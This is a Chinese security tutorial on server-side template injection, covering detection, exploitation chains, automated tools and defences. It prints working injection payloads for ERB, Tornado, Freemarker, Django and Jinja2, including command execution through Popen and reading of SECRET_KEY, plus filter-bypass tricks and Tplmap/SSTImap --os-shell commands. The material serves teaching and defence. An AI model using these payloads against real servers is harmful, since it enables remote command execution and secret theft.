@@ -1,0 +1,160 @@
+引言
+
+模板引擎是现代 Web 开发中不可或缺的一环，它将动态数据与静态模板结合，高效生成 HTML、邮件等文档。然而，当用户输入被未经严格处理地拼接到模板中，并在服务端解析执行时，便可能引发服务器模板注入（Server-Side Template Injection，SSTI）漏洞。与 SQL 注入类似，SSTI 让攻击者能够在模板上下文中注入恶意代码，轻则窃取敏感数据，重则实现远程命令执行，直接威胁服务器安全。本文将从实战案例出发，系统梳理 SSTI 的检测方法、利用技巧及自动化工具，并提供防御思路，帮助读者构建完整的知识体系。
+
+---
+
+一、SSTI 基础原理
+
+SSTI 的核心成因可概括为：用户输入被作为模板结构（而非数据）进行解析。当开发者使用 render 函数将字符串模板与变量合并渲染时，若未对用户可控的模板内容做严格过滤，攻击者便可插入模板引擎的原生语法，进而操控渲染过程。
+
+以 Python Jinja2 为例，正常的模板渲染：
+
+```python
+from jinja2 import Template
+template = Template('Hello, {{ name }}!')
+print(template.render(name='World'))   # Hello, World!
+```
+
+若 name 来自用户输入，且服务端直接拼接模板字符串，攻击者构造 name = {{ 7*7 }}，渲染结果将变成 Hello, 49!，表明注入成功。更危险的 payload 可直接调用 Python 内建函数，执行系统命令。
+
+---
+
+二、典型模板引擎的 SSTI 测试（实践）
+
+不同模板引擎语法各异，识别引擎类型是攻击的第一步。以下通过 PortSwigger 提供的靶场环境，演示四种常见引擎的检测 payload。
+
+1. ERB（Ruby 语言）
+
+ERB 是 Ruby 默认的模板引擎，使用 <%= ... %> 输出表达式，<% ... %> 执行代码。
+
+```erb
+<%= exec 'ls -al' %>
+```
+
+若服务端存在漏洞，该 payload 会执行 ls -al 命令并回显结果。
+
+2. Tornado（Python 语言）
+
+Tornado 模板默认使用 {{ ... }} 输出变量，支持 {% ... %} 执行语句。
+测试基础运算：
+
+```
+blog-post-author-display=user.name}}{{7*7}}
+```
+
+返回 user.name49 则确认注入。进一步命令执行：
+
+```
+blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('ls%20-al')
+```
+
+URL 编码后的 {% import os %} 结合 {{ os.system('ls -al') }}，达到命令执行。
+
+3. Freemarker（Java 语言）
+
+Freemarker 提供了强大的内建函数，其中 ?new() 可动态实例化类。
+
+```freemarker
+<#assign test="freemarker.template.utility.Execute"?new()> ${test("ls")}
+```
+
+Execute 类是 Freemarker 内置的用于执行系统命令的实用工具，直接调用即可获取输出。
+
+4. Django（Python 语言）
+
+Django 模板默认对变量属性访问有限制，但某些配置下仍可通过 settings 对象获取敏感信息。
+
+```
+{{settings.SECRET_KEY}}
+```
+
+若成功回显 Django 密钥，表明存在 SSTI，并可能进一步通过 settings 访问其他模块。
+
+利用报错识别引擎：当输入错误语法（如 {{1/0}}）或未闭合标签时，服务端返回的异常信息常会暴露使用的模板框架。例如 Jinja2 报错可能包含 jinja2.exceptions.UndefinedError，Freemarker 则可能输出 freemarker.core.InvalidReferenceException。此技巧在信息收集阶段极为有效。
+
+---
+
+三、SSTI 利用方法论（理论提升）
+
+成功检测到 SSTI 后，如何最大化利用？以下总结了一套通用思路，尤其适用于 Python、Ruby 等面向对象语言。
+
+1. 确定模板引擎
+
+· 语法探测：输入 {{7*7}}、${7*7}、<%= 7*7 %> 等不同风格 payload，观察回显。
+· 报错诱导：输入 {{config}}、{{self}} 等对象，查看是否返回配置信息。
+· 上下文分析：观察模板中已暴露的变量（如 user、request），可作为攻击入口。
+
+2. 构造 payload 的通用路径
+
+在沙盒模板环境中，攻击者通常需要通过“寻链”方式突破限制：
+
+1. 寻找可用对象：从模板上下文中获取已知对象，如字符串、数组、已定义的变量。
+2. 获取基类：利用 Python 的 __class__、__bases__、__mro__ 等魔术方法，逐层向上找到 object 基类。
+3. 遍历子类：通过 __subclasses__() 获取所有继承自 object 的类，从中筛选出可利用的类（如 os._wrap_close、subprocess.Popen）。
+4. 实例化并执行：调用目标类的成员方法执行系统命令或读取文件。
+
+经典 Jinja2 链示例：
+
+```
+{{''.__class__.__mro__[1].__subclasses__()}}
+```
+
+定位到 subprocess.Popen 类后：
+
+```
+{{''.__class__.__mro__[1].__subclasses__()[468]('ls', shell=True, stdout=-1).communicate()}}
+```
+
+（注：子类索引因环境而异，需动态测试）
+
+3. 绕过过滤技巧
+
+· 拼接字符串：'im' + 'port' 绕过关键词检测。
+· 使用字符编码：__import__ 替换为 __builtins__。
+· 利用过滤器：Jinja2 的 |attr() 方法动态获取属性。
+
+---
+
+四、自动化工具的应用
+
+手工构造 SSTI 利用链往往繁琐，尤其在寻找子类索引时。此时，成熟的自动化工具可大幅提升效率。
+
+Tplmap
+
+Tplmap（已停止维护但仍在广泛使用）是一个 Python 编写的 SSTI 检测与利用工具，支持 Jinja2、Freemarker、Velocity、Smarty 等数十种引擎。其工作原理类似于 SQLmap，通过盲注或显错判断注入点，并自动获取子类、执行命令。
+
+```bash
+./tplmap.py -u "http://target.com/?name=*" --os-shell
+```
+
+SSTImap
+
+SSTImap 是 Tplmap 的延续项目，功能更完善，支持更多引擎（如 Twig、Marko），且兼容 Python 3。它还提供交互式 shell、文件读写、端口扫描等扩展功能。
+
+```bash
+./sstimap.py -u "http://target.com/?name=inject" --engine Jinja2 --os-shell
+```
+
+工具局限：自动化工具依赖已知特征库，对于定制化模板引擎或存在 WAF 的环境可能失效。此外，工具盲目发送大量 payload 易触发熔断。因此，手工结合自动化才是高效利用的黄金法则。
+
+---
+
+五、实战挖掘与防御启示
+
+挖掘案例参考
+
+奇安信补天平台的一篇技术分享（https://forum.butian.net/share/1229）详细记录了从一处看似无害的页面参数开始，逐步探测出 Jinja2 模板注入，最终绕过过滤获取服务器权限的过程。文中强调了“参数联动”与“二次编码”在绕过过滤中的重要性，值得深入研读。
+
+防御措施
+
+1. 避免拼接模板：尽量将用户输入作为数据传入，而不是拼接模板字符串。例如 Python 中应使用 render(data) 而非 render_string(template.replace(user_input))。
+2. 沙箱隔离：使用 Jinja2 的 SandboxedEnvironment，限制危险属性访问。
+3. 最小权限原则：模板渲染进程应使用低权限账户，防止 RCE 后提权。
+4. 输入验证：对用户输入进行严格的上下文敏感过滤，或采用白名单策略。
+
+---
+
+结语
+
+SSTI 从最初被视为小众漏洞，如今已跻身 OWASP Top 10 候选列表，成为攻防演练中的高频突破口。理解其底层原理、掌握多引擎的检测与利用方法，是每一位 Web 安全研究者的必修课。同时，自动化工具的使用应建立在扎实的手工基础上，方能应对千变万化的实际场景。希望通过本文的梳理，读者能构建起从“发现”到“利用”再到“防御”的完整闭环，在攻防博弈中占据主动。
